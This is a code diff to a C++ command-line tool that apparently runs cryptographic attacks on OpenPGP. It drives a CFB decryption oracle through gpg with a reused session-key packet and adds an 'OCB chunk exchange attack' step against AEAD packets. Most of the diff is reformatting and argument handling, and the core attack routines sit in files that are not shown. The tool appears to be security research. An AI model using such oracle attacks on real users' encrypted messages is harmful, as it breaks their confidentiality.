@@ -14,9 +14,9 @@
 #include "util.h"
 #include "generic_packet.h"
 #include "detect_pattern.h"
+#include "ocb-oracle.h"
 
 args::Group arguments("arguments");
-
 
 struct args_info_t
 {
@@ -27,7 +27,6 @@ struct args_info_t
 
 template <typename T>
 std::unique_ptr<args::ValueFlag<T>> value_flag_from_args_info(args::Group& group, args_info_t const& args_info);
-
 
 template <typename T>
 std::unique_ptr<args::ValueFlag<T>> value_flag_from_args_info(args::Group& parser, args_info_t const& args_info)
@@ -56,7 +55,6 @@ static const args_info_t run_time_data_log_dir_info {
 
 };
 } // namespace cli_args
-
 
 void ensure_string_arg_is_non_empty(const std::string_view s, const std::string_view argument_name)
 {
@@ -94,6 +92,7 @@ void parse_packet_cmd(args::Subparser& parser)
 
     std::cout << parse_packet_sequence(bin_data).to_string() << std::endl;
 }
+
 void invoke_decryption_cmd(args::Subparser& parser)
 {
 
@@ -213,14 +212,17 @@ void query_oracle_for_file_cmd(args::Subparser& parser)
 void check_pattern_rep_in_cfb_plaintext_cmd(args::Subparser& parser)
 {
 
-    args::ValueFlag<std::string> input_data_file_arg(
-        parser, "FILE", "path to file with plaintext data to search", {'i', cli_args::input_data_file}, args::Options::Required);
+    args::ValueFlag<std::string> input_data_file_arg(parser,
+                                                     "FILE",
+                                                     "path to file with plaintext data to search",
+                                                     {'i', cli_args::input_data_file},
+                                                     args::Options::Required);
 
     parser.Parse();
     std::string input_data_file_path = args::get(input_data_file_arg);
-    auto input_data = read_binary_file(input_data_file_path);
+    auto input_data                  = read_binary_file(input_data_file_path);
 
-    if(detect_pattern::has_byte_string_repeated_block_at_any_offset(input_data, 1))
+    if (detect_pattern::has_byte_string_repeated_block_at_any_offset(input_data, 1))
     {
         std::cout << "detected block pattern repetition of length 1\n";
     }
@@ -228,15 +230,15 @@ void check_pattern_rep_in_cfb_plaintext_cmd(args::Subparser& parser)
     {
         std::cout << "no pattern repetition found\n";
     }
-
-
 }
+
 void decryption_of_random_blocks_cmd(args::Subparser& parser)
 {
     args::ValueFlag<uint32_t> nb_leading_random_bytes_arg(
         parser,
         "BYTE-COUNT",
-        "Number of leading random bytes at the start of the 2nd-step CFB ciphertext. Will be rounded up to a multiple of the block size if not a multiple of the block size.",
+        "Number of leading random bytes at the start of the 2nd-step CFB ciphertext. Will be rounded up to a multiple "
+        "of the block size if not a multiple of the block size.",
         {"l", "nb-leading-random-bytes"},
         args::Options::Required | args::Options::Single);
 
@@ -248,12 +250,20 @@ void decryption_of_random_blocks_cmd(args::Subparser& parser)
         {'u', cli_args::reused_pkesk},
         args::Options::Required | args::Options::Single);
 
-    args::ValueFlag<std::string> file_with_query_data_arg(
+    /*args::ValueFlag<std::string> file_with_query_data_arg(
         parser,
         "FILE",
         "path to a file containing the blocks to be AES-decrypted in binary format. The file length must be a multiple "
         "of 16 bytes.",
         {"file-with-query-data"},
+        args::Options::Single);*/
+
+
+    args::ValueFlag<std::string> aead_packet_file_arg(
+        parser,
+        "FILE",
+        "path to a binary file (not ASCII-armored) containing the AEAD packet to attack",
+        {"file-with-aead-packet"},
         args::Options::Single);
 
     args::ValueFlag<uint32_t> query_data_repetition_arg(
@@ -293,7 +303,6 @@ void decryption_of_random_blocks_cmd(args::Subparser& parser)
     parser.Parse();
 
 
-
     std::string session_key_hex = args::get(session_key_arg);
     std::vector<uint8_t> session_key;
     if (session_key_hex.size() > 0)
@@ -304,26 +313,44 @@ void decryption_of_random_blocks_cmd(args::Subparser& parser)
     size_t iterations = args::get(iterations_arg);
 
     uint32_t query_data_repetitions         = args::get(query_data_repetition_arg);
-    uint32_t nb_leading_random_bytes = args::get(nb_leading_random_bytes_arg);
+    uint32_t nb_leading_random_bytes        = args::get(nb_leading_random_bytes_arg);
     std::string reused_pkesk_path           = args::get(reused_pkesk_arg);
     std::filesystem::path tmp_msg_file_dir  = args::get(tmp_dir_arg);
     std::filesystem::path tmp_msg_file_path = tmp_msg_file_dir / "opgp_att_msg.bin";
 
     const unsigned block_size = 16;
 
-    std::filesystem::path file_with_query_data_path = args::get(file_with_query_data_arg);
-    if (file_with_query_data_path == "" && query_data_repetitions == 0)
+    /*if (file_with_aead_packet == "" && query_data_repetitions == 0)
     {
         throw cli_exception_t(
             "must provide --query-repeat-count with a positive (non-zero) value if a query data file is specified");
+    }*/
+
+    std::vector<uint8_t> aead_packet_encoded;
+    if (aead_packet_file_arg)
+    {
+
+        std::filesystem::path file_with_aead_packet = args::get(aead_packet_file_arg);
+        auto aead_file_data                         = read_binary_file(file_with_aead_packet);
+        auto all_packets                            = parse_packet_sequence(aead_file_data);
+        for (auto const& p : all_packets)
+        {
+            if (p->raw_tag() == packet::tag_e::aead)
+            {
+                aead_packet_encoded = p->get_encoded();
+                break;
+            }
+        }
+        if (aead_packet_encoded.size() == 0)
+        {
+            throw Exception("provided file for AEAD packet does not seem to contain an AEAD packet");
+        }
     }
 
-    auto query_data = read_binary_file(file_with_query_data_path);
-    if (query_data.size() % block_size)
-    {
-        throw Exception("query data file must have a size of a multiple of 16 bytes");
-    }
-    uint32_t nb_blocks_in_query_data_pattern = query_data.size();
+
+    std::vector<uint8_t> query_data(AES_BLOCK_SIZE); // zero block
+
+    size_t nb_blocks_in_query_data_pattern = query_data.size();
     if (query_data.size() * query_data_repetitions > 100 * 1000 * 1000)
     {
         throw Exception("trying to create query data of more than 100 MB, this is prohibited");
@@ -335,33 +362,35 @@ void decryption_of_random_blocks_cmd(args::Subparser& parser)
     run_time_ctrl_t rtc(run_time_log_dir_path);
     auto pkesk_bytes                          = read_binary_file(reused_pkesk_path);
     size_t count_non_empty_decryption_results = 0;
-    size_t count_non_empty_recovered_blocks = 0;
+    size_t count_non_empty_recovered_blocks   = 0;
     std::cout << std::format("running {} iterations\n\n", iterations);
+    openpgp_app_decr_params_t decr_params = {
+        .app_type         = openpgp_app_e::gnupg,
+        .application_path = "gpg",
+    };
     for (uint32_t i = 0; i < iterations; i++)
     {
-        auto decr_result_set = cfb_opgp_decr_oracle(rtc,
-                                                i,
-                                                openpgp_app_decr_params_t {
-                                                    .app_type         = openpgp_app_e::gnupg,
-                                                    .application_path = "gpg",
-                                                },
-                                                nb_leading_random_bytes,
-                                                std::span(pkesk_bytes),
-                                                query_data,
-                                                query_data_repetitions,
-                                                tmp_msg_file_path,
-                                                session_key);
 
-        auto decr_result = decr_result_set.decryption_result;
+        auto decr_result_set = cfb_opgp_decr_oracle_inital_query(rtc,
+                                                                 i,
+                                                                 decr_params,
+                                                                 nb_leading_random_bytes,
+                                                                 std::span(pkesk_bytes),
+                                                                 query_data,
+                                                                 query_data_repetitions,
+                                                                 tmp_msg_file_path,
+                                                                 session_key);
+
+        auto decr_result      = decr_result_set.decryption_result;
         auto recovered_blocks = decr_result_set.recovered_encrypted_blocks;
         if (decr_result.size() > 0)
         {
             std::cout << std::format("decryption result with size {}\n", decr_result.size());
             count_non_empty_decryption_results++;
         }
-        if(recovered_blocks.size() > 0)
+        if (recovered_blocks.size() > 0)
         {
-            std::cout << std::format("recovered oracle data of size {}\n", recovered_blocks.size());
+            std::cout << std::format("recovered {} oracle blocks \n", recovered_blocks.size());
             count_non_empty_recovered_blocks++;
         }
         try
@@ -372,11 +401,26 @@ void decryption_of_random_blocks_cmd(args::Subparser& parser)
         {
             std::cerr << std::format("error deleting tmp message file at {}\n", std::string(tmp_msg_file_path));
         }
+        if (aead_packet_encoded.size() && recovered_blocks.size())
+        {
+
+            auto encrypted_zero_block = recovered_blocks[0];
+            std::cout << "starting OCB chunk exchange attack...\n";
+            ocb_attack_change_order_of_chunks(i,
+                                              decr_result_set.vector_ciphertext,
+                                              std::span(pkesk_bytes),
+                                              session_key,
+                                                aead_packet_encoded,
+                                              encrypted_zero_block,
+                                              decr_params
+                                              );
+
+        }
     }
-    std::cout << std::format(
-        "\n\n{} from {} decryptions returned non-empty decryption results.\n", count_non_empty_decryption_results, iterations);
-    std::cout << std::format(
-        "For {} decryptions the oracle data was recovered.\n", count_non_empty_recovered_blocks);
+    std::cout << std::format("\n\n{} from {} decryptions returned non-empty decryption results.\n",
+                             count_non_empty_decryption_results,
+                             iterations);
+    std::cout << std::format("For {} decryptions the oracle data was recovered.\n", count_non_empty_recovered_blocks);
 }
 
 /*
@@ -488,11 +532,11 @@ int main(int argc, char* argv[])
                                               "invoke the decryption of random data as the SED packet in a gpg message",
                                               &decryption_of_random_blocks_cmd);
 
-    args::Command check_pattern_rep_in_cfb_plaintext(commands,
-            "detect-pattern",
-            "check a binary input file for the occurrence of directly adjacent repeated blocks",
-            &check_pattern_rep_in_cfb_plaintext_cmd
-            );
+    args::Command check_pattern_rep_in_cfb_plaintext(
+        commands,
+        "detect-pattern",
+        "check a binary input file for the occurrence of directly adjacent repeated blocks",
+        &check_pattern_rep_in_cfb_plaintext_cmd);
 
     args::Command self_test(commands, "self-test", "run self-tests", &run_self_tests_cmd);
     args::GlobalOptions globals(p, arguments);
